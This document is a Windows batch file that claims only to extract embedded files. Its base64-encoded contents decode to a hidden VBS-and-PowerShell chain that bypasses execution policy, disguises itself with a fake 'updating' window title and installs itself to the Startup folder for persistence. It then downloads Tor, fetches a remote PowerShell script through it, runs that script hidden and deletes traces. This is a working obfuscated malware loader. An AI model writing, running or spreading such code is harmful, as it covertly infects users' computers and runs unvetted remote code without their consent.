@echo off
:: Extract embedded files
setlocal enabledelayedexpansion

if not exist "client" mkdir "client"

echo Extracting client/run-tor-exectuor.bat...
powershell -Command "[System.IO.File]::WriteAllBytes('client/run-tor-exectuor.bat', [System.Convert]::FromBase64String('QGVjaG8gb2ZmDQp3c2NyaXB0ICIuL3J1bi52YnMiDQpleGl0DQo='))"

if not exist "client" mkdir "client"

echo Extracting client/run.vbs...
powershell -Command "[System.IO.File]::WriteAllBytes('client/run.vbs', [System.Convert]::FromBase64String('U2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCnNoZWxsLlJ1biAicG93ZXJzaGVsbCAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiIi4vdG9yLWV4ZWN1dG9yLnBzMSIiIiwgMCwgRmFsc2UNCg=='))"

if not exist "client" mkdir "client"

echo Extracting client/tor-executor.ps1...
powershell -Command "[System.IO.File]::WriteAllBytes('client/tor-executor.ps1', [System.Convert]::FromBase64String('IyBoaWRlICtzaG9ydGN1dA0KJEhvc3QuVUkuUmF3VUkuV2luZG93VGl0bGUgPSAiUG93ZXJTaGVsbCBpcyBVcGRhdGluZy4uLiAoRG9uJ3QgY2xvc2UhKSINCg0KIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBTZWxm4oCRaW5zdGFsbCB0byBTdGFydHVwIChoaWRkZW4pDQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiRTY3JpcHRQYXRoID0gJE15SW52b2NhdGlvbi5NeUNvbW1hbmQuUGF0aA0KJFN0YXJ0dXBGb2xkZXIgPSBbRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCJTdGFydHVwIikNCiRTaG9ydGN1dFBhdGggPSBKb2luLVBhdGggJFN0YXJ0dXBGb2xkZXIgKFtJTy5QYXRoXTo6R2V0RmlsZU5hbWVXaXRob3V0RXh0ZW5zaW9uKCRTY3JpcHRQYXRoKSArICIubG5rIikNCg0KaWYgKC1ub3QgKFRlc3QtUGF0aCAkU2hvcnRjdXRQYXRoKSkgew0KICAgICRXc2hTaGVsbCA9IE5ldy1PYmplY3QgLUNvbU9iamVjdCBXU2NyaXB0LlNoZWxsDQogICAgJFNob3J0Y3V0ID0gJFdzaFNoZWxsLkNyZWF0ZVNob3J0Y3V0KCRTaG9ydGN1dFBhdGgpDQoNCiAgICAkU2hvcnRjdXQuVGFyZ2V0UGF0aCA9ICJwb3dlcnNoZWxsLmV4ZSINCiAgICAkU2hvcnRjdXQuQXJndW1lbnRzID0gIi1Ob1Byb2ZpbGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSBgIiRTY3JpcHRQYXRoYCIiDQogICAgJFNob3J0Y3V0LldvcmtpbmdEaXJlY3RvcnkgPSBTcGxpdC1QYXRoICRTY3JpcHRQYXRoDQogICAgJFNob3J0Y3V0Lkljb25Mb2NhdGlvbiA9ICIkZW52OlN5c3RlbVJvb3RcU3lzdGVtMzJcc2hlbGwzMi5kbGwsMSINCg0KICAgICRTaG9ydGN1dC5TYXZlKCkNCn0NCg0KZWNobyAiSW1wb3J0YW50IFVwZGF0ZXMgYXJlIGRvbmUuLi4iDQplY2hvICJEb24ndCBjbG9zZSB1bnRpbCBmaW5pc2hlZC4uLiINCg0KIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBDb25maWd1cmF0aW9uDQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQokUCA9ICRQU1NjcmlwdFJvb3QNCiRCYXNlRGlyID0gSm9pbi1QYXRoICRQICJ0b3ItZXhlIg0KJEFyY2hpdmUgPSBKb2luLVBhdGggJFAgInRvci1leHBlcnQudGFyLmd6Ig0KJFRvckV4ZSA9IEpvaW4tUGF0aCAkQmFzZURpciAidG9yLmV4ZSINCiRUb3JVcmwgPSAiaHR0cHM6Ly9hcmNoaXZlLnRvcnByb2plY3Qub3JnL3Rvci1wYWNrYWdlLWFyY2hpdmUvdG9yYnJvd3Nlci8xNS4wLjMvdG9yLWV4cGVydC1idW5kbGUtd2luZG93cy14ODZfNjQtMTUuMC4zLnRhci5neiINCg0KJFRvclBvcnQgPSA5MDUwDQokRGF0YURpciA9IEpvaW4tUGF0aCAkUCAidG9yLWRhdGEiDQojICRPbmlvblVybCA9ICJodHRwczovL2R1Y2tkdWNrZ29nZzQyeGpvYzcyeDNzamFzb3dvYXJmYmdjbXZmaW1hZnR0NnR3YWdzd3pjemFkLm9uaW9uLyINCiRPbmlvblVybCA9ICJodHRwczovL21hbnVlbHdlc3Rlcm1laWVyLmdpdGh1Yi5pby90ZXN0LnBzMSINCg0KIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBIZWxwZXIgRnVuY3Rpb25zDQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpmdW5jdGlvbiBEb3dubG9hZC1Ub3Igew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSAkVXJsID0gJFRvclVybCwNCiAgICAgICAgW3N0cmluZ10gJE91dEZpbGUgPSAkQXJjaGl2ZQ0KICAgICkNCg0KICAgIFdyaXRlLUhvc3QgIkRvd25sb2FkaW5nIFRvciBleHBlcnQgYnVuZGxlLi4uIg0KICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJFVybCAtT3V0RmlsZSAkT3V0RmlsZSAtVXNlQmFzaWNQYXJzaW5nDQoNCiAgICBpZiAoKEdldC1JdGVtICRPdXRGaWxlKS5MZW5ndGggLWx0IDVNQikgew0KICAgICAgICBSZW1vdmUtSXRlbSAtRm9yY2UgJE91dEZpbGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgdGhyb3cgIkRvd25sb2FkIGZhaWxlZCBvciBhcmNoaXZlIHRvbyBzbWFsbC4iDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBFeHRyYWN0LVRvciB7DQogICAgcGFyYW0oDQogICAgICAgIFtzdHJpbmddICRBcmNoaXZlRmlsZSA9ICRBcmNoaXZlLA0KICAgICAgICBbc3RyaW5nXSAkRGVzdGluYXRpb24gPSAkQmFzZURpcg0KICAgICkNCg0KICAgIFdyaXRlLUhvc3QgIkV4dHJhY3RpbmcgVG9yLi4uIg0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJERlc3RpbmF0aW9uKSkgeyANCiAgICAgICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgLVBhdGggJERlc3RpbmF0aW9uIHwgT3V0LU51bGwgDQogICAgfQ0KDQogICAgdGFyLmV4ZSAteHpmICRBcmNoaXZlRmlsZSAtQyAkRGVzdGluYXRpb24gLS1zdHJpcC1jb21wb25lbnRzPTENCiAgICBSZW1vdmUtSXRlbSAkQXJjaGl2ZUZpbGUgLUZvcmNlDQoNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRUb3JFeGUpKSB7IHRocm93ICJ0b3IuZXhlIG5vdCBmb3VuZCBhZnRlciBleHRyYWN0aW9uLiIgfQ0KICAgIFdyaXRlLUhvc3QgIlRvciBleHRyYWN0ZWQgdG8gJERlc3RpbmF0aW9uIg0KfQ0KDQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEVuc3VyZSBUb3IgZXhpc3RzDQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQp0cnkgew0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJFRvckV4ZSkpIHsNCiAgICAgICAgRG93bmxvYWQtVG9yDQogICAgICAgIEV4dHJhY3QtVG9yDQogICAgfQ0KICAgIGVsc2Ugew0KICAgICAgICBXcml0ZS1Ib3N0ICJUb3IgZXhlY3V0YWJsZSBhbHJlYWR5IHByZXNlbnQ6ICRUb3JFeGUiDQogICAgfQ0KfQ0KY2F0Y2ggew0KICAgIFdyaXRlLUVycm9yICJFcnJvciBkb3dubG9hZGluZyBvciBleHRyYWN0aW5nIFRvcjogJF8iDQogICAgZXhpdCAxDQp9DQoNCiMgRW5zdXJlIGRhdGEgZGlyZWN0b3J5IGV4aXN0cw0KaWYgKC1ub3QgKFRlc3QtUGF0aCAkRGF0YURpcikpIHsgDQogICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgLVBhdGggJERhdGFEaXIgfCBPdXQtTnVsbCANCn0NCg0KIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBTdGFydCBUb3IgcHJvY2Vzcw0KIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJFRvciA9IFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRUb3JFeGUgYA0KICAgIC1Bcmd1bWVudExpc3QgIi0tU29ja3NQb3J0ICRUb3JQb3J0IC0tRGF0YURpcmVjdG9yeSBgIiREYXRhRGlyYCIiIGANCiAgICAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbg0KDQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFdhaXQgdW50aWwgVG9yIFNPQ0tTIHBvcnQgaXMgcmVhZHkNCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCldyaXRlLUhvc3QgIldhaXRpbmcgZm9yIFRvciBTT0NLUyBwb3J0ICRUb3JQb3J0Li4uIg0Kd2hpbGUgKC1ub3QgKFRlc3QtTmV0Q29ubmVjdGlvbiAxMjcuMC4wLjEgLVBvcnQgJFRvclBvcnQpLlRjcFRlc3RTdWNjZWVkZWQpIHsgDQogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgMSANCn0NCg0KIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBGZXRjaCBvbmlvbiBzaXRlIGNvbnRlbnQgKHNhdmUgdG8gZmlsZSkNCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiRPdXRwdXRGaWxlID0gSm9pbi1QYXRoICRQICJkYXRhLnBzMSINCg0KdHJ5IHsNCiAgICBXcml0ZS1Ib3N0ICJGZXRjaGluZyAkT25pb25VcmwgdmlhIFRvciAoc2F2aW5nIHRvIGRhdGEucHMxKS4uLiINCiAgICBjdXJsLmV4ZSAtLXNvY2tzNS1ob3N0bmFtZSAiMTI3LjAuMC4xOiRUb3JQb3J0IiAtcyAkT25pb25VcmwgYA0KICAgICAgICB8IE91dC1GaWxlIC1GaWxlUGF0aCAkT3V0cHV0RmlsZSAtRW5jb2RpbmcgVVRGOCAtRm9yY2UNCn0NCmZpbmFsbHkgew0KICAgIGlmICgkVG9yIC1hbmQgISRUb3IuSGFzRXhpdGVkKSB7IA0KICAgICAgICBXcml0ZS1Ib3N0ICJTdG9wcGluZyBUb3IuLi4iDQogICAgICAgICRUb3IuS2lsbCgpIA0KICAgIH0NCn0NCg0KcG93ZXJzaGVsbC5leGUgLUFyZ3VtZW50TGlzdCAiLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgJE91dHB1dEZpbGUiIC1XaW5kb3dTdHlsZSBIaWRkZW4NCg0KaWYgKFRlc3QtUGF0aCAkT3V0cHV0RmlsZSkgew0KICAgIFJlbW92ZS1JdGVtIC1QYXRoICRPdXRwdXRGaWxlIC1Gb3JjZQ0KfQ=='))"

:: Run the main BAT file
call client/run-tor-exectuor.bat

:: Cleanup extracted files
del "client/run-tor-exectuor.bat"
del "client/run.vbs"
del "client/tor-executor.ps1"
endlocal
